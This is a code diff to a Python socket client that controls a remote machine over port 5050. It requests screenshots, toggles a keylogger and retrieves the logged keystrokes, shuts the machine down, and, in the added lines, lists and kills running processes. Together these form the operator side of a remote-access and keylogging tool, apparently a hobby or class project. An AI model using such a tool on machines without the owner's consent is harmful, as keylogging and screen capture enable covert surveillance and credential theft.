@@ -4,17 +4,19 @@ import io
 
 HEADER = 64
 PORT = 5050
-SERVER = input("Enter host IP: ")
+SERVER = ""
 FORMAT = 'utf-8'
 DISCONNECT_MSG = "!DISCONNECT"
 SCREENSHOT_MSG = "!SCREENSHOT"
 SHUTDOWN_MSG = "!SHUTDOWN"
 KEYLOG_MSG = "!KEYLOG"
+GETAPP_MSG = "!GETAPP"
+KILLAPP_MSG = "!KILLAPP"
 
 keylog_on = False
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((SERVER, PORT))
+
 
 def send(msg):
     message = msg.encode(FORMAT)
@@ -51,26 +53,46 @@ def receive():
         return msg
     return ""
 
+def receiveAppList():
+    appList_len = int(receive())
+    applist = []
+    for i in range(appList_len):
+        item = []
+        for j in range(4):
+            item.append(receive())
+        applist.append({"description": item[0], "app_id": item[1], "path": item[2], "thread": item[3]})
+    print("Applist received")
+    for item in applist:
+        print(item)
+
+
 def start():
     while True:
         msg = input("Enter a message (type '!SCREENSHOT' to request a screenshot or '!DISCONNECT' to quit): ")
         global keylog_on
+        send(msg)
         if msg == DISCONNECT_MSG or msg == SHUTDOWN_MSG:
-            send(msg)
-            break
+            break           
         elif msg == SCREENSHOT_MSG:
-            send(SCREENSHOT_MSG)
             screenshot_data = receive_screenshot()
             display_screenshot(screenshot_data)
         elif msg == KEYLOG_MSG:
             if not keylog_on:
                 keylog_on = True
-                send(msg)
             else:
-                send(msg)
                 keylog_on = False
                 print(f"Keylog: {receive()}")
-        else:
-            send(msg)
+        elif msg == GETAPP_MSG:
+            receiveAppList()
+        elif msg == KILLAPP_MSG:
+            app_id = input("Enter app ID to kill: ")
+            send(app_id)
+            print(receive())
 
-start()
+while True:
+    try:
+        SERVER = input("Enter host IP: ")
+        client.connect((SERVER, PORT))
+        start()
+    except:
+        print("Cannot connect to this host, please try again!")
